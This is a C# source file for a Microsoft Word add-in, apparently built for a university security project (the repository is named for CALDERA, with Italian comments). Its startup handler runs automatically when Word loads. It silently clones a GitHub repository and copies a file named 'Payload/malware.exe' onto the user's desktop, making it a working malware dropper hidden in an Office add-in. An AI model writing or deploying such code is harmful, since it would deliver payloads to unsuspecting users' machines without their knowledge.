using System;
using System.Collections.Generic;
using System.Linq;
using LibGit2Sharp;

using System.Text;
using System.Xml.Linq;
using Word = Microsoft.Office.Interop.Word;
using Office = Microsoft.Office.Core;
using Microsoft.Office.Tools.Word;
using System.IO;

namespace Platinum_Rocket
{
    public partial class Platinum_rocket
    {
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            // Imposta l'URL della repository Git
            string repositoryUrl = "https://github.com/Giorge9/Software_Security-Project_CALDERA.git";

            // Imposta il percorso del file nella repository
            string filePath = "Payload/malware.exe";

            try
            {
                // Crea una cartella temporanea
                string tempFolder = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
                Directory.CreateDirectory(tempFolder);

                // Clona la repository nella cartella temporanea
                using (var repo = new Repository(Repository.Clone(repositoryUrl, tempFolder)))
                {
                    // Ottiene il commit più recente nella repository
                    var commit = repo.Head.Tip;

                    // Recupera il contenuto del file nel commit
                    var treeEntry = commit[filePath];

                    // Verifica se il file esiste
                    if (treeEntry != null && treeEntry.TargetType == TreeEntryTargetType.Blob)
                    {
                        // Ottiene il percorso completo del file nella cartella temporanea
                        string fileInTempFolder = Path.Combine(tempFolder, filePath);

                        // Salva il contenuto del file nella cartella desktop
                        string destinationPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), treeEntry.Name);
                        File.Copy(fileInTempFolder, destinationPath, true);

                        Console.WriteLine("File scaricato con successo!");
                    }
                    else
                    {
                        Console.WriteLine("Il file specificato non esiste nella repository.");
                    }
                }

                // Elimina la cartella temporanea dopo aver terminato
                Directory.Delete(tempFolder, true);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Si è verificato un errore durante il download del file: " + ex.Message);
            }
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
        }

        #region VSTO generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }
        
        #endregion
    }
}
